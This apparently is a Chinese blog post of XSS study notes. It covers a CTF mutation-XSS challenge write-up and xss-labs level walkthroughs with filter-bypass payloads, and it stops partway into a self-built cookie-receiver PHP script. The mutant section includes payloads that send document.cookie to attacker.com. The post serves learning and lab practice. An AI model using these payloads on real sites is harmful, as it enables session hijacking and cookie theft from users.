<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一个男人一句话改变我的一生之xss</title>
      <link href="/posts/33318.html"/>
      <url>/posts/33318.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">_sun_.empty.师傅给我看了一道国际赛easy难度的xss题目，实在不会，于是打算复现一下</span><br><span class="line">结果docker的时候xss-bot拉起太慢，使用镜像之后修改文件又出现问题，所以就单纯的白盒审计一下这道题，&quot;意因&quot;一下</span><br><span class="line">这题的点是解析器的标签&quot;空间&quot;问题,以及常见的顺序验证错误【代码审计中常出现的参数可控问题】</span><br><span class="line"></span><br><span class="line">一开始看到这道题的时候还在想是不是自己的xss知识点缺失很大，于是打算整理复现一手关于xss的基础知识，方便以后见到好翻翻笔记</span><br><span class="line">结果是标签问题【更大的盲区，所以后面不涉及css之类的xss，xss原型链污染，dom属性的深层次研究，遇到了再说，嘻嘻】</span><br><span class="line">感谢sun师傅的拷打，让我又又又涨见识了</span><br><span class="line"></span><br><span class="line">这篇文章个人感觉还是很水的，因为感觉东西还是特别多，研究不深</span><br><span class="line">有什么错误的地方希望跟师傅们交流，大师傅快来拷打我，我一定会努力的，呜呜呜。</span><br></pre></td></tr></table></figure><h1 id="mutant"><a href="#mutant" class="headerlink" title="mutant"></a>mutant</h1><p><a href="https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/">https://github.com/DownUnderCTF/Challenges_2025_Public/blob/main/web/mutant/</a></p><p><img src="/../images/image-20251020163628329.png" alt="image-20251020163628329"></p><p>使用了&lt;template&gt;标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;是 HTML5 引入的特殊元素，它的内容被视为&quot;惰性&quot;的：</span><br><span class="line">不会立即渲染</span><br><span class="line">不会执行脚本</span><br><span class="line">不会加载资源</span><br><span class="line">保持内容隔离，直到被激活使用</span><br></pre></td></tr></table></figure><p>if (n.attributes)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">移除所有属性</span><br></pre></td></tr></table></figure><p>if (n.nodeName !&#x3D;&#x3D; “#document-fragment” &amp;&amp;       (n.nodeName.length &#x3D;&#x3D;&#x3D; 6 || n.nodeName.length &#x3D;&#x3D;&#x3D; 8))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">删除特定长度标签名的元素</span><br></pre></td></tr></table></figure><p>for (let i &#x3D; n.children.length - 1; i &gt;&#x3D; 0; i–)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">深度遍历整个DOM树</span><br></pre></td></tr></table></figure><p>payload解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;math&gt;</span><br><span class="line">    &lt;mtext&gt;&lt;/form&gt;</span><br><span class="line">&lt;form&gt;</span><br><span class="line">  &lt;malignmark&gt;</span><br><span class="line">    &lt;style&gt;&lt;/math&gt;</span><br><span class="line">&lt;img src onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><ol><li><p>解析器遇到<code>&lt;form&gt;</code>开始标签然后是<code>&lt;math&gt;</code>标签（MathML命名空间）接着是<code>&lt;mtext&gt;</code>标签【这里是mathml的元素】</p></li><li><p><code>&lt;/form&gt;</code>：在MathML命名空间内遇到<code>&lt;/form&gt;</code>【html元素】会触发特殊行为解析器会”关闭”当前表单，解析器对其进行处理</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;/form&gt; </span><br><span class="line">&lt;math&gt;&lt;mtext&gt;&lt;/mtext&gt;&lt;/math&gt; </span><br></pre></td></tr></table></figure></li><li><p>后续&lt;style&gt;【是在html的标签，出现在mathml中】,&lt;&#x2F;math&gt;使得解释器混淆触发闭合&lt;form&gt;</p></li><li><p><code>malignmark</code>标签名长度是10，不会被删除<code>style</code>标签名长度是5，不会被删除<code>img</code>标签名长度是3</p></li></ol><p>解释器处理时间：</p><p>DOM 变异在 <code>innerHTML</code>赋值时已经发生</p><p><code>onerror</code>在属性移除前已经生效</p><p>项目会让xss-bot来触发访问该链，要获得其cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;&lt;math&gt;&lt;mtext&gt;&lt;/form&gt;&lt;form&gt;&lt;malignmark&gt;&lt;style&gt;&lt;/math&gt;&lt;img src=1 onerror=&quot;fetch(`https://attacker.com/steal?cookie=$&#123;encodeURIComponent(document.cookie)&#125;`)&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fetch(&#x27;https://attacker.com/steal&#x27;, &#123;</span><br><span class="line">  method: &#x27;POST&#x27;,</span><br><span class="line">  headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;,</span><br><span class="line">  body: JSON.stringify(&#123;</span><br><span class="line">    cookie: document.cookie,</span><br><span class="line">    url: location.href,</span><br><span class="line">    userAgent: navigator.userAgent</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这是手搓的平台搭建获取cookie方式</p><p>这题的关键点是混淆解析器，在mathml空间中标签和html空间中标签的差异，引起解析器对于异常代码的处理</p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>有些引用在文章当中</p><p><a href="https://blog.csdn.net/2301_80637449/article/details/153076191">XSS 漏洞全解析：从原理到实战-CSDN博客</a></p><p><a href="https://xz.aliyun.com/news/12336">XSS原理分析与绕过总结-先知社区</a></p><p><a href="https://xz.aliyun.com/news/3699">XSS总结-先知社区</a></p><p><a href="https://www.freebuf.com/vuls/423546.html">XSS 漏洞深度解析：攻防对抗与高阶利用 - FreeBuf网络安全行业门户</a></p><p><a href="https://www.sqlsec.com/2020/10/xss2.html#%E6%80%BB%E7%BB%93">XSS 攻击思路总结 | 国光</a></p><p><a href="https://www.sqlsec.com/2020/01/xss.html">XSS 从零开始 | 国光</a></p><p><a href="https://www.bilibili.com/video/BV123yAYMEwb/?p=53&share_source=copy_web&vd_source=46dcac097257d547144350b30f96978c">https://www.bilibili.com/video/BV123yAYMEwb/?p=53&amp;share_source=copy_web&amp;vd_source=46dcac097257d547144350b30f96978c</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>XSS 是攻击者通过在网页中注入恶意 JavaScript 脚本，当用户访问被注入的页面时，脚本在用户浏览器中执行，从而实现窃取 cookie、劫持会话、钓鱼攻击等恶意操作的漏洞。其本质是Web 应用对用户输入的过滤不严格，导致未经过滤的输入被当作 HTML&#x2F;JavaScript 代码在浏览器中解析执行。</p><h1 id="XSS-分类"><a href="#XSS-分类" class="headerlink" title="XSS 分类"></a>XSS 分类</h1><h2 id="反射型-XSS"><a href="#反射型-XSS" class="headerlink" title="反射型 XSS"></a><strong>反射型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本通过 URL 参数传入，服务器未过滤直接返回页面中</span><br><span class="line">非持久化，需诱骗用户点击含恶意参数的 URL</span><br><span class="line">适合钓鱼攻击（如伪造登录链接）、一次性会话劫持</span><br></pre></td></tr></table></figure><h2 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a><strong>存储型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本被存储到服务器（如数据库、文件），用户访问页面时被加载执行</span><br><span class="line">持久化，所有访问该页面的用户都会触发</span><br><span class="line">危害最大，可批量攻击（如论坛、留言板）、长期控制目标</span><br></pre></td></tr></table></figure><h2 id="DOM-型-XSS"><a href="#DOM-型-XSS" class="headerlink" title="DOM 型 XSS"></a><strong>DOM 型 XSS</strong></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">恶意脚本未经过服务器，仅在客户端通过 JavaScript 操作 DOM 时注入</span><br><span class="line">完全在客户端执行，服务器响应中无恶意代码</span><br><span class="line">难被服务器端 WAF 检测，适合绕过防护机制</span><br></pre></td></tr></table></figure><h1 id="xss靶场"><a href="#xss靶场" class="headerlink" title="xss靶场"></a>xss靶场</h1><h2 id="xss-lab"><a href="#xss-lab" class="headerlink" title="xss-lab"></a>xss-lab</h2><p>【基础认识】</p><p><a href="https://www.cnblogs.com/L00kback/p/17552275.html">xss-labs靶场1-20关详解 - L00kback - 博客园</a></p><p><a href="https://skywt.cn/blog/xss-labs-tutorial#level-1%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E4%B8%BA-html">xss-labs 通关教程 - 博客</a></p><h3 id="leve1"><a href="#leve1" class="headerlink" title="leve1"></a>leve1</h3><p><img src="/../images/image-20251017141145726.png" alt="image-20251017141145726"></p><p>代码直接将从URL参数<code>name</code>获取的用户输入（<code>$str</code>）拼接进HTML页面输出</p><p>没有进行任何过滤或转义处理,直接注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve2"><a href="#leve2" class="headerlink" title="leve2"></a>leve2</h3><p><img src="/../images/image-20251017141918087.png" alt="image-20251017141918087"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">htmlspecialchars($str)  将字符串中的特殊字符转换为HTML实体</span><br></pre></td></tr></table></figure><p>但是在表单当中的value值没有进行过滤，在这里可以进行构造payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将这一句的value=&quot;x&quot;&gt;</span><br><span class="line">x如果填入&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;就等于插入了一句js代码</span><br><span class="line">value=&quot;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="leve3"><a href="#leve3" class="headerlink" title="leve3"></a>leve3</h3><p><img src="/../images/image-20251017142811091.png" alt="image-20251017142811091"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在 8.1.0 及以上的 PHP 版本中，这个函数默认会转义 &lt;、&gt;、&amp;、&#x27;、&quot; 这五个字符，基本可以防范这里的 XSS 攻击。</span><br><span class="line">但是，8.1.0 以下版本的 PHP 默认只会转义 &lt;、&gt;、&amp;、&quot; 这四个字符，不会转义单引号 &#x27;。这就给这个函数带来了巨大的安全隐患。</span><br><span class="line"></span><br><span class="line">&lt;8.1.0</span><br><span class="line">htmlspecialchars()函数把预定义的字符转换为 HTML 实体</span><br><span class="line">预定义的字符有：</span><br><span class="line"> &amp; （和号）成为 &amp;amp;</span><br><span class="line"> &quot; （双引号）成为 &amp;quot;</span><br><span class="line"> &#x27; （单引号）成为 &#x27;</span><br><span class="line"> &lt; （小于）成为 &amp;lt;</span><br><span class="line"> &gt; （大于）成为 &amp;gt;</span><br></pre></td></tr></table></figure><p>那么就可以使用’来闭合value&#x3D;’’ 但是&lt;被过滤成了&amp;1t 那么就构造不出额外的语句，在句内构造可以使用到触发器鼠标点击事件<code>onfocus``onclinck``onmouseover</code>等。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onmouseover=javascript:alert(1)</span><br><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><h3 id="leve4"><a href="#leve4" class="headerlink" title="leve4"></a>leve4</h3><p><img src="/../images/image-20251017144147810.png" alt="image-20251017144147810"></p><p>这里的value没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;和&gt;转化成空格 可以使用””闭合value构造payload 但是不能使用&lt;和&gt; 那就可以继续使用触发器来进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;onclick=&quot;alert(1)</span><br><span class="line">&quot;onmouseover=alert(1)&quot;</span><br></pre></td></tr></table></figure><h3 id="leve5"><a href="#leve5" class="headerlink" title="leve5"></a>leve5</h3><p><img src="/../images/image-20251017145015924.png" alt="image-20251017145015924"></p><p>这里的value依旧没有使用htmlspecialchar()来转义，但是使用了str_replace()来将&lt;script和on转化带下划线的形式 说明不能使用鼠标触发事件了因为都带着on，可以利用 JavaScript 的 URI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt; 标签的 href 值并非只能是 URL，而是 URI。URI（Uniform Resource Identifier）可以视为 URL 的超集，其不仅包含以 protocol://address 开头的 URL，也包含 protocol:content 这种形式的地址（参见 RFC 3986）。经常用到的有：javascript: 后接 js 代码，这样的 URI 打开后会运行一段 js 代码；mailto: 后接一个邮箱，这样的 URI 打开后会开启系统中的邮箱类应用程序，创建发送给目标地址的一封邮件。</span><br></pre></td></tr></table></figure><p>使用”&gt;闭合前一句，再构造<a></a>语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve6"><a href="#leve6" class="headerlink" title="leve6"></a>leve6</h3><p><img src="/../images/image-20251017145811434.png" alt="image-20251017145811434"></p><p>过滤增加了src,data,href</p><p>HTML 并不区分大小写,所以所以将 href 替换大小写就好了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrEf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="leve7"><a href="#leve7" class="headerlink" title="leve7"></a>leve7</h3><p>跟6不一样是简单过滤，而是全部置空了</p><p><img src="/../images/image-20251017174535233.png" alt="image-20251017174535233"></p><p>经典的只过滤了一次，只要构造了过滤之后还是能使用的payload就行了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;scriscriptpt&gt;alert(1);&lt;/scriscriptpt&gt;</span><br></pre></td></tr></table></figure><h3 id="leve8"><a href="#leve8" class="headerlink" title="leve8"></a>leve8</h3><p><img src="/../images/image-20251017183446774.png" alt="image-20251017183446774"></p><p>value的值被htmlspecialchars()函数过滤了，但是在<a>标签当中还有</p><p>想要构造javascript:alert(1)，但是会变成javascr_ipt</p><p>href的属性：href 传入的 URI 中，也可以使用 HTML 字符实体。在打开链接时，字符实体也会被转换为对应的字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTML 实体有两种写法，第一种是之前提到的 &amp;entity_name; 形式，比如 $lt; 表示小于号；第二种是 &amp;#entity_number; 形式，其中 entity_number 是字符的实体编号，比如 &amp;#60; 也能表示小于号。使用第二种方式，任何字符（包括 ASCII 字符）都有其实体表示。</span><br></pre></td></tr></table></figure><p>那么只要对payload进行html实体转化就可【全局和部分都可以】</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)</span><br><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure><h3 id="leve9"><a href="#leve9" class="headerlink" title="leve9"></a>leve9</h3><p><img src="/../images/image-20251018002224373.png" alt="image-20251018002224373"></p><p>在8的基础上对加友链进行了验证是否含有http:&#x2F;&#x2F;字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strpos()</span><br><span class="line">函数用于在字符串中查找子字符串http://的位置。如果找到了子字符串，则返回子字符串的起始位置（也就是一个非负整数值）。如果没有找到子字符串，则返回false。</span><br></pre></td></tr></table></figure><p>那么就可以开始改造8的payload,将http:&#x2F;&#x2F;注释掉就可以了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascr&amp;#x69;pt:alert(1)//http://</span><br></pre></td></tr></table></figure><h3 id="leve10"><a href="#leve10" class="headerlink" title="leve10"></a>leve10</h3><p><img src="/../images/image-20251018004243477.png" alt="image-20251018004243477"></p><p>有三个表单是hidden的，但是只有t_sort可以get控制以及参与解析</p><p>关于&lt;&gt;的过滤就可以闭合value使用鼠标事件，以及hidden可以使用type对后面的hidden进行重置就不用在html上面改出表单再提交了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1&amp;t_sort=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">?keyword=1&amp;t_sort=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve11"><a href="#leve11" class="headerlink" title="leve11"></a>leve11</h3><p><img src="/../images/image-20251018005131086.png" alt="image-20251018005131086"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_REFERER&#x27;]是一个PHP超全局变量，用于获取当前页面的前一个页面的URL地址。</span><br></pre></td></tr></table></figure><p>跟10的区别就是将payload放到了ref头上</p><p><img src="/../images/image-20251018005401956.png" alt="image-20251018005401956"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Referer：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve12"><a href="#leve12" class="headerlink" title="leve12"></a>leve12</h3><p><img src="/../images/image-20251018005528385.png" alt="image-20251018005528385"></p><p>和前面的一样，将payload改到了ua头上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-Agent：&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">User-Agent：&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve13"><a href="#leve13" class="headerlink" title="leve13"></a>leve13</h3><p><img src="/../images/image-20251018005742527.png" alt="image-20251018005742527"></p><p>和前面的一样，将payload改到了cookie头上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie：user=&quot; onclick=&quot;alert(1)&quot; type &quot;</span><br><span class="line">Cookie：user=&quot; onmouseover=javascript:alert(1) type &quot;</span><br></pre></td></tr></table></figure><h3 id="leve14"><a href="#leve14" class="headerlink" title="leve14"></a>leve14</h3><p>【链接无效】</p><p><img src="/../images/image-20251018010324147.png" alt="image-20251018010324147"></p><p>查看图片 exif 信息的网站</p><p>修改iframe调用的文件来实现xss注入</p><h3 id="leve15"><a href="#leve15" class="headerlink" title="leve15"></a>leve15</h3><p><img src="/../images/image-20251018010603698.png" alt="image-20251018010603698"></p><p>在 URL 中指定的 src（默认是 1.gif）会被引用进来，使用的是 ng-include。这是一个 Angular 框架的功能，特点是，如果引入的是 HTML 文件，不会执行其中 <code>&lt;script&gt;</code> 标签内的代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=level1.php?name=&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure><p>这里直接引用leve1的payload，当然可以自己构造</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hacked<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>假设放在网站根目录，payload 就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?src=&quot;/alert.html&quot;</span><br></pre></td></tr></table></figure><h3 id="leve16"><a href="#leve16" class="headerlink" title="leve16"></a>leve16</h3><p><img src="/../images/image-20251018011553675.png" alt="image-20251018011553675"></p><p>对空格进行了过滤，使用换行符（<code>%0A</code>）或者<code>%0d</code>也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;img%0Asrc=1%0Aonerror=&quot;alert(1)&quot;&gt;</span><br><span class="line">?keyword=&lt;svg%0Aonload=&quot;alert(1)&gt;&quot;</span><br></pre></td></tr></table></figure><h3 id="leve17"><a href="#leve17" class="headerlink" title="leve17"></a>leve17</h3><p><img src="/../images/image-20251018013156996.png" alt="image-20251018013156996"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;embed&gt; 标签用于在HTML页面中嵌入外部内容，如多媒体文件、插件或其他交互式内容。它是HTML5的一部分。</span><br><span class="line">以下是 &lt;embed&gt; 标签的基本语法：</span><br><span class="line">&lt;embed src=&quot;URL&quot; type=&quot;MIME-类型&quot; width=&quot;宽度&quot; height=&quot;高度&quot;&gt;</span><br><span class="line">常用的属性包括：</span><br><span class="line">src：指定要嵌入的外部资源的URL。可以是音频、视频、SWF 文件等。</span><br><span class="line">type：指定被嵌入资源的MIME类型。</span><br><span class="line">width：指定嵌入内容的宽度（像素或百分比）。</span><br><span class="line">height：指定嵌入内容的高度（像素或百分比）。</span><br></pre></td></tr></table></figure><p>这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。从而执行JavaScript语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmousemove=&#x27;alert(1)&#x27; </span><br><span class="line">?arg01=a&amp;arg02=b onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><h3 id="leve18"><a href="#leve18" class="headerlink" title="leve18"></a>leve18</h3><p>和17一样</p><p><img src="/../images/image-20251018014118392.png" alt="image-20251018014118392"></p><h3 id="leve19"><a href="#leve19" class="headerlink" title="leve19"></a>leve19</h3><p>后面的flash有点看不懂了，但是也是古老的东西先放着吧</p><h1 id="文件上传配合xss"><a href="#文件上传配合xss" class="headerlink" title="文件上传配合xss"></a>文件上传配合xss</h1><p>前面用了这个xss-lab来了解了基础的xss知识，那么下面来认识特殊的几种的xss系列，svg-pdf-flash-mxss-uxss。【这里不展开说明如何制作，详情可以看小迪老师的b站视频<a href="https://www.bilibili.com/video/BV123yAYMEwb/?spm_id_from=333.1387.0.0&vd_source=3cad66818fbd72b6100b5f159983493b">【小迪安全】全栈网络安全 | 渗透测试 | 高级红蓝对抗 V2024最新版 (完)_哔哩哔哩_bilibili</a>】</p><h2 id="svg-xss"><a href="#svg-xss" class="headerlink" title="svg-xss"></a>svg-xss</h2><p>SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我们平常用的jpg&#x2F;png等图片格式所不同的是SVG图像在放大或改变尺寸的情况下其图形质量不会有所损失，并且我们可以使用任何的文本编辑器打开SVG图片并且编辑它，目前主流的浏览器都已经支持SVG图片的渲染。</p><h2 id="pdf-xss"><a href="#pdf-xss" class="headerlink" title="pdf-xss"></a>pdf-xss</h2><p>PDF XSS（PDF 跨站脚本）漏洞是指攻击者通过在 PDF 文件中植入恶意 JavaScript 代码，利用 PDF 阅读器或在线预览工具的安全缺陷，实现代码执行的一类漏洞。与传统网页 XSS 不同，PDF XSS 的载体是 PDF 文件，攻击场景更隐蔽，且依赖于 PDF 处理工具的解析逻辑。</p><h2 id="swf-xss"><a href="#swf-xss" class="headerlink" title="swf-xss"></a>swf-xss</h2><p>SWF XSS 是一种通过 Flash 文件（SWF）中的漏洞执行跨站脚本攻击的技术。攻击者可以利用 SWF 文件中未正确处理的输入参数，注入恶意 JavaScript 代码，从而在目标用户的浏览器中执行。</p><h1 id="突变体xss"><a href="#突变体xss" class="headerlink" title="突变体xss"></a>突变体xss</h1><h2 id="mxss"><a href="#mxss" class="headerlink" title="mxss"></a>mxss</h2><p>预览</p><p><a href="https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&sharetype=blogdetail&sharerId=87982018&sharerefer=PC&sharesource=2403_87580523&sharefrom=from_link">https://blog.csdn.net/weixin_34087301/article/details/87982018?fromshare=blogdetail&amp;sharetype=blogdetail&amp;sharerId=87982018&amp;sharerefer=PC&amp;sharesource=2403_87580523&amp;sharefrom=from_link</a></p><h2 id="uxss"><a href="#uxss" class="headerlink" title="uxss"></a>uxss</h2><p>翻译</p><p>UXSS保留了基本XSS的特点，利用漏洞，执行恶意代码，但是有一个重要的区别：<strong>不同于常见的XSS，UXSS是一种利用浏览器或者浏览器扩展漏洞来制造产生XSS的条件并执行代码的一种攻击类型。</strong></p><p><a href="https://juejin.cn/post/7031788659221200927">通用跨站脚本攻击(UXSS)什么是UXSS？ 大家都知道有反射型XSS、存储型XSS、DomXSS，还有之前wooyun - 掘金</a></p><h1 id="平台搭建"><a href="#平台搭建" class="headerlink" title="平台搭建"></a>平台搭建</h1><h2 id="beef-xss"><a href="#beef-xss" class="headerlink" title="beef-xss"></a>beef-xss</h2><p><a href="https://www.freebuf.com/articles/web/443592.html">XSS之Beef简单使用 - FreeBuf网络安全行业门户</a></p><p>docker拉取比较快捷方便</p><h2 id="蓝莲花xss"><a href="#蓝莲花xss" class="headerlink" title="蓝莲花xss"></a>蓝莲花xss</h2><p><a href="https://blog.csdn.net/weixin_43263566/article/details/128848268">XSS 进阶篇：一文全面了解蓝莲花基本用法_xss蓝莲花-CSDN博客</a></p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><h2 id="手搓"><a href="#手搓" class="headerlink" title="手搓"></a>手搓</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 配置密码保护</span><br><span class="line">$password = &#x27;yourpassword123&#x27;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;view&#x27;]) &amp;&amp; 